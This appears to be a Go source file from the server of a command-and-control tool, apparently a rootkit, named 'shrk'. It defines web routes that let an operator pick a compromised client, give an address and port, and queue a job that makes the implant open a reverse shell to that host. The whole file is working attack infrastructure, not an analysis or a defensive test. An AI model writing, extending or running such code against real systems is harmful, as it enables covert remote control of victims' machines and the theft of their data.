package routes

import (
	"fmt"
	"math"
	"net/http"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_shell(c *fiber.Ctx) error {
	client := c.Locals("client").(*database.Client)
	return util.Render(c, "shell", fiber.Map{
		"client": client,
	})
}

func POST_shell(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type
		job    *joblist.Job
		err    error
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	body := struct {
		Addr string `form:"addr"`
		Port int    `form:"port"`
	}{}

	if err = c.BodyParser(&body); err != nil {
		return util.RenderErr(c, "invalid form data", http.StatusBadRequest)
	}

	if body.Port > math.MaxUint16 || 0 == body.Port {
		return util.RenderErr(c, "invalid port number", http.StatusBadRequest)
	}

	data := util.NewBuffer(fmt.Sprintf("%s %d", body.Addr, body.Port))
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_SHELL, data, res); err != nil {
		log.Fail("failed to add reverse shell job: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("reverse shell job timed out for %s", client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res.String() != "success" {
		return util.RenderErr(c, fmt.Sprintf(
			"shell job failed: %s", res.String(),
		), http.StatusGatewayTimeout)
	}

	return util.Redirect(c, "/")
}
